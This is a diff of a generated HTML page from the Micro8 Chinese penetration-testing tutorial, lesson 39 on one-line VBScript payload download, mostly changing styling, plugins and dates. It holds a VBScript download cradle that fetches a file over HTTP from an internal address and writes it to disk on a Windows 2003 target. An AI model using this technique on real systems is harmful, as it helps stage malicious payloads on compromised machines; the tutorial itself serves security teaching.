@@ -21,7 +21,7 @@
                 
             
                 
-                <link rel="stylesheet" href="../gitbook/gitbook-plugin-prism/prism-darcula.css">
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-prism/prism-atom-dark.css">
                 
             
                 
@@ -46,6 +46,10 @@
             
                 
                 <link rel="stylesheet" href="../gitbook/gitbook-plugin-donate/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-terminal/plugin.css">
                 
             
                 
@@ -1885,30 +1889,30 @@
 <p><strong>&#x9776;&#x673A;&#xFF1A;</strong>windows 2003<br><img src="media/130baad813eacf09b1932ecb7e5d4279.jpg" alt=""></p>
 <p><img src="media/d434ad0c2a6c5f531e908fedca5f2044.jpg" alt=""></p>
 <h3 id="&#x9644;&#xFF1A;&#x6E90;&#x7801;&#x5982;&#x4E0B;&#xFF1A;"><a name="&#x9644;&#xFF1A;&#x6E90;&#x7801;&#x5982;&#x4E0B;&#xFF1A;" class="anchor-navigation-ex-anchor" href="#&#x9644;&#xFF1A;&#x6E90;&#x7801;&#x5982;&#x4E0B;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x9644;&#xFF1A;&#x6E90;&#x7801;&#x5982;&#x4E0B;&#xFF1A;" class="plugin-anchor" href="#&#x9644;&#xFF1A;&#x6E90;&#x7801;&#x5982;&#x4E0B;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x9644;&#xFF1A;&#x6E90;&#x7801;&#x5982;&#x4E0B;&#xFF1A;</h3>
-<pre class="language-"><code class="lang-visual-basic">strFileURL <span class="token operator">=</span> <span class="token string">&quot;http://192.168.1.115/robots.txt&quot;</span>
-strHDLocation <span class="token operator">=</span> <span class="token string">&quot;c:\\test\\logo.txt&quot;</span>
-<span class="token keyword">Set</span> objXMLHTTP <span class="token operator">=</span> CreateObject<span class="token punctuation">(</span><span class="token string">&quot;MSXML2.XMLHTTP&quot;</span><span class="token punctuation">)</span>
-objXMLHTTP<span class="token punctuation">.</span>open <span class="token string">&quot;GET&quot;</span><span class="token punctuation">,</span> strFileURL<span class="token punctuation">,</span> <span class="token boolean">false</span>
-objXMLHTTP<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token keyword">If</span> objXMLHTTP<span class="token punctuation">.</span>Status <span class="token operator">=</span> <span class="token number">200</span> <span class="token keyword">Then</span>
-<span class="token keyword">Set</span> objADOStream <span class="token operator">=</span> CreateObject<span class="token punctuation">(</span><span class="token string">&quot;ADODB.Stream&quot;</span><span class="token punctuation">)</span>
-objADOStream<span class="token punctuation">.</span>Open
-objADOStream<span class="token punctuation">.</span>Type <span class="token operator">=</span> <span class="token number">1</span>
-objADOStream<span class="token punctuation">.</span>Write objXMLHTTP<span class="token punctuation">.</span>ResponseBody
-objADOStream<span class="token punctuation">.</span>Position <span class="token operator">=</span> <span class="token number">0</span>
-<span class="token keyword">Set</span> objFSO <span class="token operator">=</span> CreateObject<span class="token punctuation">(</span><span class="token string">&quot;Scripting.FileSystemObject&quot;</span><span class="token punctuation">)</span>
-<span class="token keyword">If</span> objFSO<span class="token punctuation">.</span>Fileexists<span class="token punctuation">(</span>strHDLocation<span class="token punctuation">)</span> <span class="token keyword">Then</span> objFSO<span class="token punctuation">.</span>DeleteFile strHDLocati <span class="token keyword">on</span>
-<span class="token keyword">Set</span> objFSO <span class="token operator">=</span> <span class="token boolean">Nothing</span>
-objADOStream<span class="token punctuation">.</span>SaveToFile strHDLocation
-objADOStream<span class="token punctuation">.</span>Close
-<span class="token keyword">Set</span> objADOStream <span class="token operator">=</span> <span class="token boolean">Nothing</span>
-<span class="token keyword">End</span> <span class="token keyword">if</span>
-<span class="token keyword">Set</span> objXMLHTTP <span class="token operator">=</span> <span class="token boolean">Nothing</span>
-</code></pre>
+<p><code>visual basic
+strFileURL = &quot;http://192.168.1.115/robots.txt&quot;
+strHDLocation = &quot;c:\\test\\logo.txt&quot;
+Set objXMLHTTP = CreateObject(&quot;MSXML2.XMLHTTP&quot;)
+objXMLHTTP.open &quot;GET&quot;, strFileURL, false
+objXMLHTTP.send()
+If objXMLHTTP.Status = 200 Then
+Set objADOStream = CreateObject(&quot;ADODB.Stream&quot;)
+objADOStream.Open
+objADOStream.Type = 1
+objADOStream.Write objXMLHTTP.ResponseBody
+objADOStream.Position = 0
+Set objFSO = CreateObject(&quot;Scripting.FileSystemObject&quot;)
+If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocati on
+Set objFSO = Nothing
+objADOStream.SaveToFile strHDLocation
+objADOStream.Close
+Set objADOStream = Nothing
+End if
+Set objXMLHTTP = Nothing</code></p>
 <blockquote>
 <p>  Micropoor</p>
 </blockquote>
-<footer class="page-footer-ex"> <span class="page-footer-ex-copyright"> Copyright &#xA9; 2019 Micro8. All Rights Reserved. &#x9075;&#x5FAA; <a href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh" target="_blank">&#x77E5;&#x8BC6;&#x5171;&#x4EAB; &#x7F72;&#x540D;-&#x975E;&#x5546;&#x4E1A;&#x6027;&#x4F7F;&#x7528; 4.0 &#x534F;&#x8BAE;&#x53D1;&#x5E03;</a> </span> &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; <span class="page-footer-ex-footer-update"> &#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A; 2019-02-25 </span> </footer>
+<footer class="page-footer-ex"> <span class="page-footer-ex-copyright"> Copyright &#xA9; 2019 Micro8. All Rights Reserved. &#x9075;&#x5FAA; <a href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh" target="_blank">&#x77E5;&#x8BC6;&#x5171;&#x4EAB; &#x7F72;&#x540D;-&#x975E;&#x5546;&#x4E1A;&#x6027;&#x4F7F;&#x7528; 4.0 &#x534F;&#x8BAE;&#x53D1;&#x5E03;</a> </span> &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; <span class="page-footer-ex-footer-update"> &#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A; 2019-03-03 </span> </footer>
                                 
                                 </section>
                             
@@ -1951,7 +1955,7 @@ objADOStream<span class="token punctuation">.</span>Close
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"第三十九课：vbs一句话下载payload补充","level":"1.4.39","depth":2,"next":{"title":"第四十课：ftp一句话下载payload","level":"1.4.40","depth":2,"path":"Chapter1/40_ftp一句话下载payload.md","ref":"Chapter1/40_ftp一句话下载payload.md","articles":[]},"previous":{"title":"第三十八课：certutil一句话下载payload","level":"1.4.38","depth":2,"path":"Chapter1/38_certutil一句话下载payload.md","ref":"Chapter1/38_certutil一句话下载payload.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","-highlight","prism","-sharing","sharing-plus","expandable-chapters-small","theme-comscore","splitter","github-buttons","page-footer-ex","anchors","anchor-navigation-ex","donate","ad","baidu-tongji","ga"],"root":".","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"prism":{"css":["prism-themes/themes/prism-darcula.css"]},"ad":{"contentBottom":"","contentTop":"<font size=\"6\"> 专注 APT 攻击与防御 </font>"},"baidu-tongji":{"url":"https://hm.baidu.com/hm.js","token":"b03e1a3682665e9218213dc9e1b5a428"},"page-footer-ex":{"copyright":"Copyright © 2019 Micro8. All Rights Reserved. 遵循 [知识共享 署名-非商业性使用 4.0 协议发布](https://creativecommons.org/licenses/by-nc/4.0/deed.zh)","markdown":true,"update_format":"YYYY-MM-DD","update_label":"修订时间："},"splitter":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"donate":{"alipay":"","alipayText":"支付宝打赏","button":"赞赏码","title":"有读者问赞赏码，如下，自愿：","wechat":"./dashang.png","wechatText":""},"fontsettings":{"theme":"white","family":"sans","size":2},"anchor-navigation-ex":{"associatedWithSummary":false,"float":{"floatIcon":"fa fa-anchor","level1Icon":"fa fa-hand-o-right","level2Icon":"fa fa-hand-o-right","level3Icon":"fa fa-hand-o-right","showLevelIcon":true},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":false},"theme-comscore":{},"github-buttons":{"buttons":[{"user":"micro8","repo":"Micro8-HTML","type":"star","size":"small","count":true}]},"expandable-chapters-small":{},"ga":{"configuration":"auto","token":"UA-135003278-1"},"sharing":{"qq":false,"all":["facebook","google","twitter","weibo","instapaper","linkedin","pocket","stumbleupon","douban"],"douban":false,"facebook":false,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":false,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"anchors":{},"search-plus":{}},"theme":"default","author":"Micro8 系列作者","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Micro8 系列教程","language":"zh-hans","links":{"sidebar":{"Micropoor":"https://micropoor.blogspot.com","Github Micro8":"https://github.com/micro8"}},"gitbook":"*","description":"Micro8"},"file":{"path":"Chapter1/39_vbs一句话下载payload补充.md","mtime":"2019-02-25T12:34:30.734Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-03-01T13:38:56.930Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"第三十九课：vbs一句话下载payload补充","level":"1.4.39","depth":2,"next":{"title":"第四十课：ftp一句话下载payload","level":"1.4.40","depth":2,"path":"Chapter1/40_ftp一句话下载payload.md","ref":"Chapter1/40_ftp一句话下载payload.md","articles":[]},"previous":{"title":"第三十八课：certutil一句话下载payload","level":"1.4.38","depth":2,"path":"Chapter1/38_certutil一句话下载payload.md","ref":"Chapter1/38_certutil一句话下载payload.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","-highlight","prism","sharing","expandable-chapters-small","theme-comscore","splitter","github-buttons","page-footer-ex","anchors","anchor-navigation-ex","donate","terminal","ad","baidu-tongji","ga"],"root":".","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"prism":{"css":["prism-themes/themes/prism-atom-dark.css"]},"ad":{"contentBottom":"","contentTop":"<font size=\"6\"> 专注 APT 攻击与防御 </font>"},"baidu-tongji":{"url":"https://hm.baidu.com/hm.js","token":"b03e1a3682665e9218213dc9e1b5a428"},"page-footer-ex":{"copyright":"Copyright © 2019 Micro8. All Rights Reserved. 遵循 [知识共享 署名-非商业性使用 4.0 协议发布](https://creativecommons.org/licenses/by-nc/4.0/deed.zh)","markdown":true,"update_format":"YYYY-MM-DD","update_label":"修订时间："},"splitter":{},"donate":{"alipay":"","alipayText":"支付宝打赏","button":"赞赏码","title":"有读者问赞赏码，如下，自愿：","wechat":"./dashang.png","wechatText":""},"fontsettings":{"theme":"white","family":"sans","size":2},"anchor-navigation-ex":{"associatedWithSummary":false,"float":{"floatIcon":"fa fa-anchor","level1Icon":"fa fa-hand-o-right","level2Icon":"fa fa-hand-o-right","level3Icon":"fa fa-hand-o-right","showLevelIcon":true},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":false},"theme-comscore":{},"github-buttons":{"buttons":[{"user":"micro8","repo":"Micro8-HTML","type":"star","size":"small","count":true}]},"expandable-chapters-small":{},"ga":{"configuration":"auto","token":"UA-135003278-1"},"sharing":{"all":["facebook","google","twitter","weibo","instapaper"],"facebook":true,"google":false,"instapaper":false,"twitter":true,"vk":false,"weibo":false},"terminal":{"copyButtons":true,"fade":false,"style":"flat"},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"anchors":{},"search-plus":{}},"theme":"default","author":"Micro8 系列作者","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Micro8 系列教程","language":"zh-hans","links":{"sidebar":{"Micropoor":"https://micropoor.blogspot.com","Github Micro8":"https://github.com/micro8"}},"gitbook":"*","description":"Micro8"},"file":{"path":"Chapter1/39_vbs一句话下载payload补充.md","mtime":"2019-03-03T07:40:56.322Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-03-03T11:03:03.040Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
@@ -1969,7 +1973,7 @@ objADOStream<span class="token punctuation">.</span>Close
         
     
         
-        <script src="../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
         
     
         
@@ -1986,6 +1990,10 @@ objADOStream<span class="token punctuation">.</span>Close
     
         
         <script src="../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-terminal/plugin.js"></script>
         
     
         
